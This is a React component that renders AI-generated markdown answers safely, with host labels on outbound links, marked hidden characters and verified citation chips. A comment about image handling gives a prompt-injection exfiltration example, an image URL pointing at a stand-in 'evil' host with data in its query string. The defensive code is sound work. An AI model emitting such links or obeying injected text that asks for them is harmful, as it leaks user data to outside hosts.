import type { ReactNode } from 'react'
import ReactMarkdown from 'react-markdown'
import remarkGfm from 'remark-gfm'
import { codePoint, highlight, splitHidden } from '../../lib/style/highlight'
import { decode, headingId } from '../../lib/url'
import type { Citation } from '../../types/repo/code'
import type { Repo } from '../../types/repo/repo'
import { type CiteTarget, parseCitation } from '../repo/sourceLinks'
import { CitationChip } from './CitationChip'
import { Mermaid } from './diagram/Mermaid'
import './source.css'

// The host of a link that leaves this site: generated text may carry a prompt-injected link. A "//host/…" link
// is relative in form, so each is read against this site, and only another origin counts.
function hostOf(href?: string) {
  try {
    const url = new URL(href ?? '', location.origin)
    return (url.protocol === 'http:' || url.protocol === 'https:') && url.origin !== location.origin ? url.host : ''
  } catch {
    return '' // not a URL
  }
}

// A link out of generated text: a new tab, with its host beside it unless the text is the address itself.
function Outbound({ href, children }: { href?: string; children: ReactNode }) {
  const host = hostOf(href)
  return (
    <a href={href} target="_blank" rel="noreferrer">
      {children}
      {host && children !== href && <span className="text-muted-foreground"> ({host})</span>}
    </a>
  )
}

type Hast = { type: string; tagName?: string; value?: string; properties?: Record<string, unknown>; children?: Hast[] }

/**
 * A rehype plugin: the hidden characters of prose and inline code get the marker highlight() gives those in code
 * blocks (left to it), so a direction control in generated text reorders nothing past it.
 */
function revealHidden() {
  const walk = (node: Hast) => {
    if (node.tagName === 'pre') return
    node.children = node.children?.flatMap((child): Hast[] => {
      if (child.type !== 'text') {
        walk(child)
        return [child]
      }
      return splitHidden(child.value ?? '').map((part, i) =>
        i % 2
          ? {
              type: 'element',
              tagName: 'span',
              properties: { className: ['hidden-char'], dataCp: codePoint(part) },
              children: [{ type: 'text', value: part }],
            }
          : { type: 'text', value: part },
      )
    })
  }
  return walk
}

// A mermaid block is drawn; revealHidden leaves the text of every block as written. Made once, here: a component
// made anew at each render is a new type to React, and the diagram would be drawn again from nothing each time.
function Pre({ node, children }: { node?: unknown; children?: ReactNode }) {
  const code = (node as Hast | undefined)?.children?.[0]
  const classes = code?.tagName === 'code' ? code.properties?.className : undefined
  if (Array.isArray(classes) && classes.includes('language-mermaid')) {
    return (
      <Mermaid
        code={(code?.children ?? [])
          .map((c) => c.value ?? '')
          .join('')
          .replace(/\n$/, '')}
      />
    )
  }
  return <pre>{children}</pre>
}

/**
 * Renders an answer or wiki page; links into repo's source that citations hold become citation chips. top is the
 * highest heading level the text may take, when the page puts a heading of its own above it (an answer's question).
 */
export function Markdown({
  text,
  citations,
  repo,
  onCite,
  top,
}: {
  text: string
  citations: Citation[]
  repo: Pick<Repo, 'url'>
  onCite: (c: CiteTarget) => void
  top?: 'h2' | 'h3'
}) {
  return (
    <div className="markdown">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        rehypePlugins={[revealHidden]}
        components={{
          ...(top ? { h1: top, h2: top } : {}),
          a({ href, children }) {
            const c = parseCitation(href, repo)
            // The model can write a link into the source itself; only one the citations hold was checked.
            if (
              c &&
              citations.some((v) => v.path === c.path && v.startLine === c.startLine && v.endLine === c.endLine)
            ) {
              return <CitationChip {...c} onClick={() => onCite(c)} />
            }
            // In-page: stays in this tab, and reaches a wiki heading by the id it was given (WikiArticle).
            if (href?.startsWith('#'))
              return <a href={href === '#' ? href : `#${headingId(decode(href.slice(1)))}`}>{children}</a>
            return <Outbound href={href}>{children}</Outbound>
          },
          // Generated text never loads an image: its URL could carry data away (a prompt-injected ![](https://evil/?q=…)).
          // It becomes a link instead, its host shown like any other's.
          img({ src, alt }) {
            return typeof src === 'string' && src ? <Outbound href={src}>{alt || src}</Outbound> : alt
          },
          // A table wider than the text scrolls in its own box; its cells wrap between words.
          table({ children }) {
            return (
              <div className="mb-[18px] overflow-x-auto print:overflow-visible">
                <table>{children}</table>
              </div>
            )
          },
          pre: Pre,
          // A code block ends in a newline; inline code never holds one. Every block is highlighted, in a known language
          // or not, so its hidden characters show; inline code had them marked by revealHidden.
          code({ className, children }) {
            if (typeof children !== 'string' || !children.endsWith('\n')) return <code>{children}</code>
            const lang = /language-([\w.-]+)/.exec(className ?? '')?.[1] ?? ''
            return (
              // biome-ignore lint/security/noDangerouslySetInnerHtml: highlight() escapes the code and marks its hidden characters
              <code className="hljs" dangerouslySetInnerHTML={{ __html: highlight(children.slice(0, -1), lang) }} />
            )
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  )
}
